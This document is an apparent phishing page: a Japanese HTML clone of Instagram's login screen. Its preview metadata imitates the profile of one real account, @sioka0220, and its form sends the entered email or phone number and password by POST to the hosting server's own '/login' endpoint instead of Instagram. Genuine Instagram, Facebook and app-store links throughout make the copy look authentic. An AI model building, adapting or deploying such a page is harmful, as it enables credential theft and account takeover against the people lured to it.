
<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Instagram - ログイン</title>
    <meta property="og:type" content="profile">
    <meta property="og:title" content="@sioka0220 - Instagram">
    <meta
        property="og:description"
        content="Instagramで@sioka0220のプロフィールを見る"
    >

    <meta
        property="og:url"
        content="https://www.instagram.com/sioka0220/"
    >

    <!-- プロフィール画像を使う場合は、ここに画像URL -->
    <meta
        property="og:image"
        content="https://scontent-itm1-1.cdninstagram.com/v/t51.75761-19/496070452_17843526519480683_421307156340089074_n.jpg?stp=dst-jpg_s150x150_tt6&_nc_cat=111&ccb=7-5&_nc_sid=f7ccc5&efg=eyJ2ZW5jb2RlX3RhZyI6InByb2ZpbGVfcGljLnd3dy4xMDgwLkMzIn0%3D&_nc_ohc=SwIlyzo3ntYQ7kNvwG9IkDC&_nc_oc=AdoFxGfOTmh3NOU5I1bE7nwqY2KTg1kgkTi5gKULPwaOYxsmnmTtsgjM_kirlZzW6XU&_nc_zt=24&_nc_ht=scontent-itm1-1.cdninstagram.com&_nc_gid=IFcEVWQUzSXytGXKebdb_Q&_nc_ss=7b689&oh=00_AQIpNCPxuGdFt8Lixo9jZ69gaNReqtDwak7xaKkKjbepUg&oe=6AB1CE4C"
    >

    <meta property="og:site_name" content="Instagram">
    <link rel="stylesheet" href="style.css">
</head>

<body>

    <main class="container">

        <!-- ログインボックス -->
        <section class="login-card">

            <h1 class="logo">Instagram</h1>

            <!-- ログインフォーム -->
            <form class="login-form" action="/login" method="POST">

                <div class="form-group">

                    <label>
                        メールアドレスまたは電話番号
                        <span class="required">*</span>
                    </label>

                    <input
                        type="text"
                        name="email"
                        required
                    >

                </div>


                <div class="form-group">

                    <label>
                        パスワード
                        <span class="required">*</span>
                    </label>

                    <input
                        type="password"
                        name="password"
                        required
                    >

                    <a
                        class="forgot-password"
                        href="https://www.instagram.com/accounts/password/reset/"
                        target="_blank"
                        rel="noopener noreferrer"
                    >
                        パスワードをお忘れですか？
                    </a>

                </div>


                <!-- フォームを送信するボタン -->
                <button
                    type="submit"
                    class="login-button"
                >
                    ログイン
                </button>

            </form>


            <!-- 区切り -->
            <div class="divider">

                <span></span>

                <p>または</p>

                <span></span>

            </div>


            <!-- Facebookログイン -->
            <a
                class="facebook-login"
                href="https://www.facebook.com/"
                target="_blank"
                rel="noopener noreferrer"
            >
                Facebookでログイン
            </a>


        </section>


        <!-- アカウント登録 -->
        <section class="signup-card">

            <p>
                アカウントをお持ちでないですか？

                <a
                    href="https://www.instagram.com/accounts/emailsignup/"
                    target="_blank"
                    rel="noopener noreferrer"
                >
                    登録する
                </a>
            </p>

        </section>


        <!-- アプリ -->
        <p class="app-text">
            アプリをダウンロード
        </p>


        <div class="app-buttons">

            <a
                href="https://apps.apple.com/app/instagram/id389801252"
                target="_blank"
                rel="noopener noreferrer"
            >
                App Store
            </a>

            <a
                href="https://play.google.com/store/apps/details?id=com.instagram.android"
                target="_blank"
                rel="noopener noreferrer"
            >
                Google Play
            </a>

        </div>

    </main>


    <!-- フッター -->
    <footer>

        <p>
            © 2026 Instagramログインページ
        </p>

    </footer>

</body>
</html>
